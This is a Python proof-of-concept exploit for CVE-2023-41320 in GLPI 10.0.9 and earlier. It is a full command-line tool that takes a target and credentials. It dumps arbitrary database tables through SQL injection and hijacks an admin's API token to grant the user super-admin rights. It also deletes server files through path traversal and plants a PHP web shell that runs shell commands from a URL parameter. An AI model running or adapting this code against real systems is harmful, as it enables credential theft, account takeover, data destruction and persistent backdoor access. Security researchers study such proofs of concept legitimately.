import argparse
import requests
import datetime
import readline
import random
import base64
import json
import sys
import re
import os
from packaging import version
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class CustParser:
    """
    CustParser is the class used for parsing arguments
    Default is only adding verbosity and color
    """
    def __init__(self):
        self.parser = argparse.ArgumentParser(description='Poc to exploit vulnerable target')
        self.args = None

    def init_parser_and_parse(self):

        common_parser = argparse.ArgumentParser(description='Poc to exploit vulnerable target')
        common_parser.add_argument('--no-color', action='store_true', help='Do not color the output')
        common_parser.add_argument('-v', '--verbose', action='store_true', help='add verbosity')
        common_parser.add_argument('--proxy', help='Proxy to use')
        common_parser.add_argument('-ua', '--user-agent', help='User-agent to use (default: "python-requests")')
        common_parser.add_argument('-u', '--username', help='Username to use', required=True)
        common_parser.add_argument('-p', '--password', help='Password to use', required=True)
        common_parser.add_argument('-t', '--target', help='Target to attack', required=True)
        common_parser.add_argument('--auth', help='Authentication to use (default: empty)', default="")
        common_parser.add_argument('--store-column', help='Column to use to store result (default: %(default)s)', default="realname")

        subparsers = self.parser.add_subparsers(dest='action', required=True)

        sqli = subparsers.add_parser('sqli', help='Exploit sql injection (255 chars max)', parents=[common_parser], add_help=False,
                        description="Exploit the sql injection recovering row by row")
        sqli.add_argument("--table-name", help="Table name to read value from (ex: glpi_users)", required=True)
        sqli.add_argument("--columns", help="Columns name to retrieve (ex: 'name, password')", required=True)
        sqli.add_argument("--offset", help="Offset of the data to retrieve (default: %(default)s, \"*\" to recover all)", default="0")

        elevate = subparsers.add_parser('elevate', help='Elevate privileges of your account', parents=[common_parser], add_help=False,
                        description="Add another profile to the account used to login. Once done you will see the profil super-admin added to your account (Do not forget to remove it :D).")
        elevate.add_argument("--api-key", help="The new api-key to set (default: random)")

        delete = subparsers.add_parser('delete', help='Delete a file on the target (relative path)', parents=[common_parser], add_help=False,
                        description="Delete a file on the web server from a relative path (Staring at: /var/www/html/files/_pictures/<filename>)")
        delete.add_argument("--filename", help="The file to delete", required=True)

        check = subparsers.add_parser('check', help='Check if glpi version and conf are vulenrable to Remote Code Execution', parents=[common_parser], add_help=False,
                        description="Check if the GLPI is vulnerable to Remote Code Execution by looking at the version and the Web server configuration")
        
        rce = subparsers.add_parser('rce', help='Try to exploit the remote code execution on glpi', parents=[common_parser], add_help=False,
                        description="Exploit RCE on glpi by removing the .htaccess file and adding a backdoor. The extension php must be authorized to upload (use other actions of the exploit to do this)")

        self.args = self.parser.parse_args()

    def __getitem__(self, arg):
        return getattr(self.args, arg)

class Printer:
    """ Helper for logging output (static methods only)"""
    LOAD = ['\\', '-', '/', '-']
    ANSI_RED = "\x1b[31m"
    ANSI_GREEN = "\x1b[32m"
    ANSI_YELLOW = "\x1b[33m"
    ANSI_BLUE = "\x1b[34m"
    ANSI_RESET = "\x1b[0m"

    verbose = False

    @staticmethod
    def log(m, end="\n"):
        print("{}[>]{} {}".format(Printer.ANSI_BLUE, Printer.ANSI_RESET, m), end=end)

    @staticmethod
    def warn(m, end="\n"):
        print("{}[!]{} {}".format(Printer.ANSI_YELLOW, Printer.ANSI_RESET, m), end=end)

    @staticmethod
    def msg(m, end="\n"):
        print("{}[+]{} {}".format(Printer.ANSI_GREEN, Printer.ANSI_RESET, m), end=end)

    @staticmethod
    def err(m, end="\n"):
        print("{}[-]{} {}".format(Printer.ANSI_RED, Printer.ANSI_RESET, m), end=end, file=sys.stderr)

    @staticmethod
    def vlog(m, end="\n"):
        if(Printer.verbose):
            Printer.log(m, end)

    @staticmethod
    def vmsg(m, end="\n"):
        if(Printer.verbose):
            Printer.msg(m, end)

    @staticmethod
    def verr(m, end="\n"):
        if(Printer.verbose):
            Printer.err(m, end)
    
    @staticmethod
    def loading(i):
        if(i % 50 == 0):
            print("[{}] Loading...".format(str(Printer.LOAD[i % 4])), end="\r")

    @staticmethod
    def bar_load(i, max_bar):
        BAR_LENGTH = 40
        PERCENTAGE = ((i*BAR_LENGTH)//max_bar)

        print("[{}>{}]".format("="*PERCENTAGE, " "*(BAR_LENGTH - PERCENTAGE)), end="\r")

    @staticmethod
    def set_color(noColor):
        if (noColor):
            Printer.ANSI_RED = ""
            Printer.ANSI_GREEN = ""
            Printer.ANSI_YELLOW = ""
            Printer.ANSI_BLUE = ""
            Printer.ANSI_RESET = ""

    @staticmethod
    def banner():
        print("""
 ,----.   ,--.   ,------. ,--.                             
'  .-./   |  |   |  .--. '|  |     ,---. ,--.  ,--. ,---.  
|  | .---.|  |   |  '--' ||  |    | .-. : \\  `'  / | .-. | 
'  '--'  ||  '--.|  | --' |  |    \\   --. /  /.  \\ | '-' ' 
 `------' `-----'`--'     `--'     `----''--'  '--'|  |-'  
                                                   `--'
    CVE-2023-41320 by Guilhem RIOUX (\x1b[93m@jrjgjk\x1b[0m) for glpi <= 10.0.9                                   
            """)

class Exploit:
    """
    Class responsible for exploiting the target
    This class will be the parent for the subclass exploiting
    """

    _ROUTES = {
        "index"         : "/index.php",
        "login"         : "/front/login.php",
        "itil"          : "/ajax/itillayout.php",
        "perso"         : "/ajax/common.tabs.php?_target=/front/preference.php&_itemtype=Preference&_glpi_tab=User",
        "logout"        : "/front/logout.php",
        "config_all"    : "/ajax/telemetry.php",
        "update_user"   : "/front/profile_user.form.php",
        "user"          : "/front/user.php",
        "update_pref"   : "/front/preference.php",
        "central_tab"   : "/ajax/common.tabs.php?_target=/front/central.php&_itemtype=Central&_glpi_tab=Central$0",
        "upload"        : "/ajax/fileupload.php"
        }

    def __init__(self, target, username, password, proxy):
        self.target = target
        self.username = username
        self.password = password
        self.s = requests.Session()
        if(proxy != None):
            self.s.proxies = {"http": proxy, "https": proxy}

    def parse(self):
        if(self.target == None):
            Printer.err("No target specified...")
            exit(1)

        if(self.username != None):
            Printer.vlog(f"Starting exploit on target {self.target}")
            Printer.vlog(f"Credentials: {self.username} / {self.password}")

    def get_csrf(self, html):
        CSRF_REG = re.compile(r'<meta property="glpi:csrf_token" content="(.*?)" />')
        CSRF_REG_LEGACY = re.compile(r'<input type="hidden" name="_glpi_csrf_token" value="(.*?)" />')
        try:
            return re.findall(CSRF_REG, html)[0]
        except:
            try:
                return re.findall(CSRF_REG_LEGACY, html)[0]
            except:
                Printer.err("Cannot find CSRF token...")
                exit(1)

    def get_url(self, route):
        return self.target.rstrip("/") + Exploit._ROUTES[route.lower()]


class GlpiExploit(Exploit):
    """
    This class will be able to exploit Glpi
    Also it will be able to use important function such as login, csrf lookup, etc...
    """

    _TABLE = "glpi_users"
    _COLUMN_DEST = None # store the result in column realname by default

    def __init__(self, target, username, password, proxy, auth):
        super().__init__(target, username, password, proxy)
        self.csrfToken = None
        self.fields = {"login": "", "password": ""}
        self.isLoggedin = False
        self.auth = auth

    @classmethod
    def set_column_to_receive_result(cls, val):
        cls._COLUMN_DEST = val
        Printer.vlog(f"Storing result in column: {Printer.ANSI_YELLOW}\"{cls._COLUMN_DEST}\"{Printer.ANSI_RESET}")

    def login(self):
        if(self.isLoggedin):
            self.logout()

        self.refresh_all()
        loginData = {
            "noAuto": 0,
            "redirect": "",
            "_glpi_csrf_token": self.csrfToken,
            self.fields["login"]: self.username,
            self.fields["password"]: self.password,
            "auth": self.auth,
            "submit": ""
        }

        res = self.s.post(self.get_url("login"), data=loginData, verify=False)

        if not("login.php" in res.url):
            self.isLoggedin = True
            Printer.msg(f"Login successfull as {self.username}")
            return True

        else:
            Printer.err(f"Login failed for {self.username}, check your credentials")
            return False

    def sql_injection(self, table_to_read="glpi_users", column_to_read="name, password", offset="0"):
        counted_rows = None
        if(offset == "*"):
            Printer.log(f"Dumping all rows from table {table_to_read}")
            counted_rows = int(self.count_row_from_table(table_to_read))
            Printer.vlog(f"Got {str(counted_rows)} rows for the table {table_to_read}")

        Printer.log(f"Exploiting Sql Injection")
        print(" | ".join(column_to_read.split(',')))

        if(counted_rows != None):
            for i in range(counted_rows):
                SqlInjectionRes = self.exploit_sqlinjection(table_to_read, column_to_read, i)
                SqlEncoder.parse_sql_result(SqlInjectionRes)
        else:
            SqlInjectionRes = self.exploit_sqlinjection(table_to_read, column_to_read, offset)
            SqlEncoder.parse_sql_result(SqlInjectionRes)

        # Once done, reset value to NULL
        self.reset_sqli()
    
    def reset_sqli(self):
        self.set_user_val("NULL", f'name={self.username}', True)

    def count_row_from_table(self, table_to_read):
        if(table_to_read == "glpi_users"):
            SqlPayload = f'(SELECT COUNT(*) FROM (SELECT * FROM {table_to_read}) AS temp_table)'
        else:
            SqlPayload = f'(SELECT COUNT(*) FROM {table_to_read})'

        self.set_user_val(SqlPayload, f'name={self.username}', True)
        return self.get_sql_res()


    def exploit_sqlinjection(self, table_to_read, column_to_read, offset):
        SqlPayload = self.build_sqli(table_to_read, column_to_read, offset)
        
        self.set_user_val(SqlPayload, f'name={self.username}', True)

        return self.get_sql_res()


    def build_sqli(self, table_to_read, column_to_read, offset):
        gc_cols = SqlEncoder.encode_cols(column_to_read)
        if(table_to_read == "glpi_users"):
            SqlPayload = f'(SELECT {gc_cols} FROM (SELECT * FROM {table_to_read}) AS temp_table LIMIT 1 OFFSET {offset})'
        else:
            SqlPayload = f'(SELECT {gc_cols} FROM {table_to_read} LIMIT 1 OFFSET {offset})'

        return SqlPayload

    def get_sql_res(self):
        pref = self.s.get(self.get_url("perso"), verify=False)
        return self.extract_val_from_pref(pref.text)

    def set_user_val(self, value, where_cond, raw=False):
        # self.set_user_val('(SELECT group_concat(name, 0x3a, password) LIMIT 1)', 'name=glpi', True)
        res = self.s.get(self.get_url("index"), verify=False)
        self.csrfToken = self.get_csrf(res.text)

        where_col, where_cond_encoded = SqlEncoder.encode_where_clauses(where_cond)
        if not(raw):
            value_encoded = SqlEncoder.encode_str_payload(value)
        else:
            value_encoded = value

        sqlPayload = f"', itil_layout=NULL, {GlpiExploit._COLUMN_DEST}={value_encoded} WHERE {where_col}={where_cond_encoded}; -- '"

        update_payload = {
            "itil_layout" : sqlPayload
            }

        ajax_header = { "X-Glpi-Csrf-Token": self.csrfToken }

        res = self.s.post(self.get_url("itil"), headers=ajax_header, data=update_payload, verify=False)

    def elevate_account(self, api_key, new_profile="4"):
        ### Check if the account is already super-admin
        if(self.is_already_admin()):
            Printer.log("Your account is already Super-Admin, aborting exploit")
            return

        ### Check if the account has an api_token already
        my_id = self.get_my_id()
        Printer.vlog(f"{self.username}'s id: {my_id}")
        glpi_admin_users = self.find_admin()
        Printer.vlog("Admin users on glpi found:")
        Printer.vlog(", ".join(glpi_admin_users))

        Printer.log(f"Hijacking identity of admin: {glpi_admin_users[0]}")

        admin_target = glpi_admin_users[0]

        admin_target_encoded = SqlEncoder.encode_str_payload(admin_target)
        self.set_user_val(f"(SELECT api_token FROM (SELECT * FROM glpi_users) AS temp_table WHERE name={admin_target_encoded})", f'name={self.username}', True)
        api_token = self.get_sql_res()
        if(api_token == ""):
            api_token = "NULL" # In case api key was empty, reset it to null after exploit
            Printer.log(f"No api token for user: {admin_target}")
            Printer.log(f"Backdooring account by adding new Api Key: {api_key}")

            api_key_encoded = SqlEncoder.encode_str_payload(api_key)
            self.set_user_val(f"NULL, api_token={api_key_encoded}", f"name={admin_target}", True)

        else:
            api_key = api_token

        Printer.msg(f"api_token for user {admin_target}: {api_key}")
        Printer.vlog("Trying to login with the new account")

        # Resetting SQL Injection result to NULL
        self.reset_sqli()
        if(self.login_with_api_token(api_key)):
            Printer.vmsg(f"Elevating privs of the user with id {my_id}")
            self.update_profile(my_id, new_profile)
            Printer.log("Exploit done, connect with your account and use your new privileges")
        else:
            Printer.err("Failed to login with api key...")

        if(api_token == "NULL"):
            Printer.vlog(f"Resetting Api Key for user {admin_target}")
            self.set_user_val(f"NULL, api_token={api_token}", f"name={admin_target}", True)

    def is_already_admin(self):
        res = self.s.get(self.get_url("index"))
        if("Super-Admin" in res.text):
            return True
        else:
            return False

    def get_my_id(self):
        self.set_user_val("(SELECT id)", f"name={self.username}", True)
        my_id = self.get_sql_res()
        if(my_id == ""):
            Printer.err("Cannot recover id, check regex on code, exiting...")
            exit(1)
        return my_id

    def upload_file(self, file_content, filename="exploit.php"):
        res = self.s.get(self.get_url("index"), verify=False)
        self.csrfToken = self.get_csrf(res.text)

        update_pref = {
            "name": (None, "_uploader_picture"),
            "_uploader_picture[]": (filename, file_content)
        }

        CSRF = {
            "X-Glpi-Csrf-Token": self.csrfToken
        }

        res = self.s.post(self.get_url("upload"), files=update_pref, headers=CSRF, verify=False).json()
        upload_res = res["_uploader_picture"][0]

        if not("error" in upload_res.keys()):
            Printer.msg(f"File: {filename} successfully uploaded")
            return True

        elif("error" in upload_res.keys()):
            Printer.err(f"Cannot upload file: \"{upload_res['error']}\"")
            return False

        else:
            Printer.err("Unknow error occured...")
            return False


    def achieve_rce(self):
        exploit_name = "exp" + Util.random_str(15) + ".php"

        ### First upload a web-shell only to rewrite .htaccess previously removed
        write_shell = b"<?php\n"
        write_shell += b"echo 'Temp Web shell';\n"
        write_shell += b"if( isset($_POST['filename']) && isset($_POST['b64_content']) ){\n"
        write_shell += b"\tfile_put_contents($_POST['filename'], base64_decode($_POST['b64_content']));\n"
        write_shell += b"}\n"

        ### Define web shell here
        web_shell = b"<?php\n"
        web_shell += b"if( isset($_GET['cmd']) ) {\n"
        web_shell += b"\tsystem($_GET['cmd'] . ' 2>&1');\n"
        web_shell += b"}\n"

        htaccess = b"""<IfModule mod_authz_core.c>\nRequire all denied\n</IfModule>\n<IfModule !mod_authz_core.c>\ndeny from all\n</IfModule>\n"""

        if(self.upload_file(write_shell, exploit_name)):
            Printer.log("/!\\ Entering sensible zone /!\\")
            self.delete_file("../.htaccess")
            test = self.s.get(f"{self.target}/files/_tmp/{exploit_name}")
            if("Temp Web shell" in test.text):
                Printer.msg("Whouhou, .htaccess removed !!")

                Printer.log("Resetting everything")
                Printer.vlog("Moving php shell on web root")
                self.s.post(f"{self.target}/files/_tmp/{exploit_name}", data={"filename": "../../glpi_backdoor.php", "b64_content": base64.b64encode(web_shell) }, verify=False)

                Printer.vlog("Rewriting .htaccess")
                self.s.post(f"{self.target}/files/_tmp/{exploit_name}", data={"filename":"../.htaccess", "b64_content": base64.b64encode(htaccess) }, verify=False)

                Printer.vlog("Removing exploit")
                self.delete_file(f"../_tmp/{exploit_name}")

                Printer.msg("Everything looks good")
                Printer.msg(f"{self.target}/glpi_backdoor.php?cmd=whoami")

            else:
                Printer.err("Unknnow error.. Maybe you have not the right to remove the .htaccess")

        else:
            Printer.err("Have you add php extension in document type ??")
            return 0

    def update_profile(self, user_id, new_profile="4"):
        user_form = self.s.get(self.get_url("user"), verify=False)
        self.csrfToken = self.get_csrf(user_form.text)

        update_data = {
            "users_id": user_id,
            "entities_id": "0",
            "profiles_id": new_profile,
            "is_recursive": "0",
            "add":"Add",
            "_glpi_csrf_token":self.csrfToken
            }

        self.s.post(self.get_url("update_user"), data=update_data, verify=False)

    def find_admin(self):
        self.set_user_val(f"(SELECT GROUP_CONCAT(users_id) FROM glpi_profiles_users WHERE profiles_id=4)", f'name={self.username}', True)
        admins_id = self.get_sql_res().split(',')
        in_admins_id = '(' + ', '.join(admins_id) + ')'

        self.set_user_val(f"(SELECT GROUP_CONCAT(name) FROM (SELECT * FROM glpi_users WHERE id IN {in_admins_id} AND is_active=1) AS temp_table)", f'name={self.username}', True)
        all_admins = self.get_sql_res().split(',')
        return all_admins

    def logout(self):
        self.s.get(self.get_url("logout"), verify=False)
        self.isLoggedin = False

    def dump_cookie(self):
        cookies = requests.utils.dict_from_cookiejar(self.s.cookies)
        Printer.log(f"Cookies for login: ({self.target}/front/central.php)")
        all_cookies = []
        for k,v in cookies.items():
            cook = {}
            cook["name"] = k
            cook["value"] = v
            all_cookies.append(cook)
        print(json.dumps(all_cookies))

    def login_with_api_token(self, api_token):
        if(self.isLoggedin):
            self.logout()

        self.refresh_all()
        loginData = {
            "redirect": "",
            "_glpi_csrf_token": self.csrfToken,
            self.fields["login"]: self.username,
            self.fields["password"]: self.password,
            "auth": self.auth,
            "submit": "",
            "user_token": api_token
        }

        res = self.s.post(self.get_url("login"), data=loginData, verify=False)

        if not("login.php" in res.url):
            self.isLoggedin = True
            return True

        else:
            return False

    def delete_file(self, filename):
        filename_encoded = SqlEncoder.encode_str_payload(filename)
        self.set_user_val(f"NULL, picture={filename_encoded}", f"name={self.username}", True)
        Printer.log(f"Picture set to {filename}")
        Printer.vlog("Triggering deletion of the picture..")

        my_id = self.get_my_id()
        Printer.vmsg(f"Id of current user: {my_id}")

        resp = self.s.get(self.get_url("index"), verify=False)
        self.csrfToken = self.get_csrf(resp.text)

        update_pref = {
            "id": (None, my_id),
            "_blank_picture": (None, "1"),
            "update": (None, "Save"),
            "_glpi_csrf_token": (None, self.csrfToken)
        }

        self.s.post(self.get_url("update_pref"), files=update_pref, verify=False)
        Printer.msg("File shall have been deleted, cannot check it from web")


    def extract_val_from_pref(self, html, val=None):
        if val is None:
            val = GlpiExploit._COLUMN_DEST

        soup = BeautifulSoup(html, "html.parser")
        res = soup.find(attrs={"name": val})

        if res:
            if res.has_attr("value"):
                return res["value"]
        
        Printer.err("Result not found...")
        Printer.verr(f"Could not find {val} in the html DOM... Maybe use the \"--store-column\" to store the result elsewhere")
        exit(0)

    def refresh_all(self):
        resp = self.s.get(self.get_url("index"), verify=False)
        soup = BeautifulSoup(resp.text, "html.parser")
        login_input = soup.find(attrs={"id": "login_name"})
        pass_input = soup.find(attrs={"type": "password"})

        if(login_input and pass_input):
            self.fields["login"] = login_input["name"]
            self.fields["password"] = pass_input["name"]
        else:
            Printer.err("Could not recovered the input fields to login, exiting...")
            exit(1)

        # merci Issam
        if self.auth == "":
            authent = soup.find(attrs={"name": "auth"})
            if(authent):
                options = authent.findAll('option')
                for option in options:
                    if option.has_attr("selected"):
                        self.auth = option["value"]
                        break
                    else:
                        self.auth = option["value"]
        

        if self.auth != "":
            Printer.vlog(f"Using authentication: {self.auth}")

        self.csrfToken = self.get_csrf(resp.text)
        Printer.vlog(f"Csrf Token recovered: {self.csrfToken}")

    def check_rce(self):
        glpi_ver = self.get_glpi_version()
        if(glpi_ver < version.parse("10.0.7")):
            Printer.msg("Glpi version shall be vulnerable to Remote Code Execution")
        
        elif(glpi_ver <= version.parse("10.0.9")):
            Printer.vlog("Cannot check with version if server is vulnerable, checking with central dashboard")
            MSG = "Web server root directory configuration is not safe as it permits"
            central = self.s.get(self.get_url("central_tab"), verify=False)
            if(MSG in central.text):
                Printer.msg("Glpi server is not configured securely, shall be vulnerable to RCE")

            else:
                Printer.err("Glpi seems not vulnerable to RCE")
                Printer.log("The RCE is exploitable on other condition that this tool cannot check")
                Printer.log("It will be vulnerable if the apache mod_rewrite is done through a '.htaccess' on which you have write access (Usually in GLPI_ROOT/.htaccess), you know how to check ;)")

        else:
            Printer.err("Glpi version seems not vulnerable to Remote Code Execution")


    def get_glpi_version(self):
        res = self.s.get(self.get_url("config_all"), verify=False)
        to_extact = re.compile(r">\s*({.*?})\s*</code>", re.DOTALL)
        glpi_json = re.findall(to_extact, res.text)
        glpi_version = ""

        try:
            json_res = json.loads(glpi_json[0])
            glpi_version = json_res["glpi"]["version"]

        except Exception as e:
            Printer.verr("Cannot parse glpi version from telemetry (are you admin ??)...")
            Printer.vlog("Parsing version from js variable")
            res = self.s.get(self.get_url("index"), verify=False)
            glpi_version = re.findall(r'"version":\s*"([0-9\.]+)"', res.text)[0]

        Printer.msg(f"Glpi version in used: {glpi_version}")
        return version.parse(glpi_version)

    def is_admin(self):
        res = self.s.get(self.get_url("central_tab"), verify=False)
        print(res.text)
        return

class GlobalAttr:
    @staticmethod
    def change_user_agent(ua = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0"):
        if(ua != None):
            requests.utils.default_user_agent = lambda: ua


class Util:

    _ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

    @staticmethod
    def random_str(l = 32):
        return ''.join(random.choice(Util._ALPHABET) for i in range(l))

class SqlEncoder:

    _SEPARATOR = "!:!"

    @staticmethod
    def encode_str_payload(payload):
        res = "0x"
        for c in payload:
            res += hex(ord(c))[2:].zfill(2)
        return res

    @staticmethod
    def encode_where_clauses(where):
        where_col, where_cond = where.split("=")
        return where_col.strip(), SqlEncoder.encode_str_payload(where_cond.strip())

    @staticmethod
    def encode_cols(cols):
        sep = SqlEncoder.encode_str_payload(SqlEncoder._SEPARATOR)
        sql_format = f'CONCAT_WS({sep}, {cols.strip()})'
        return sql_format

    @staticmethod
    def parse_sql_result(res):
        print(" | ".join(res.split(SqlEncoder._SEPARATOR)))


if(__name__ == '__main__'):
    ### Init argument parser
    myParser = CustParser()
    myParser.init_parser_and_parse()

    if(myParser["action"] == None):
        Printer.err("No action specified, action available: [sqli, account]")
        exit(0)

    Printer.banner()

    ### Init variables (verbosity / coloring output)
    Printer.set_color(myParser["no_color"])
    Printer.verbose = myParser["verbose"]

    ### Change default user-agent
    GlobalAttr.change_user_agent(myParser["user_agent"])

    # Starting program
    Printer.vlog("Turning verbosity on")
    GlpiExploit.set_column_to_receive_result(myParser["store_column"])
    glpi = GlpiExploit(myParser["target"], myParser["username"], myParser["password"], myParser["proxy"], myParser["auth"])
    glpi.parse()

    if not(glpi.login()):
        exit(0)

    if(myParser["action"] == "elevate"):
        new_api_key = myParser["api_key"]
        if(new_api_key == None):
            new_api_key = Util.random_str()
        Printer.log(f"Exploiting privilege escalation, api key generated: {new_api_key}")
        glpi.elevate_account(new_api_key)
        Printer.log("If everything went well, you shall be able to connect here:")
        Printer.log(f"{glpi.target}/index.php?redirect=%2Ffront%2Fhelpdesk.public.php?newprofile=4")

    elif(myParser["action"] == "sqli"):
        table_name = myParser["table_name"]
        columns = myParser["columns"]
        offset = myParser["offset"]
        Printer.log(f"Recovering {columns} from {table_name} at offset {offset}")
        glpi.sql_injection(table_name, columns, offset)

    elif(myParser['action'] == "delete"):
        filename = myParser["filename"]
        Printer.warn(f"Deleting file {filename} will completely delete the file on the server")
        delete = input(f"You sure you wanna delete the file {filename} ? (yes / no) ")
        if(delete == "yes"):
            Printer.log(f"Starting deleting file named: {filename}")
            glpi.delete_file(filename)

    elif(myParser["action"] == "check"):
        Printer.log("Checking for RCE on glpi")
        glpi.check_rce()

    elif(myParser["action"] == "rce"):
        Printer.warn("This exploit might require manual actions and is not opsec safe")
        rce = input(f"You sure you wanna continue ? (yes / no) ")
        if(rce == "yes"):
            Printer.log("Trying to exploit Remote Code Execution")
            glpi.achieve_rce()

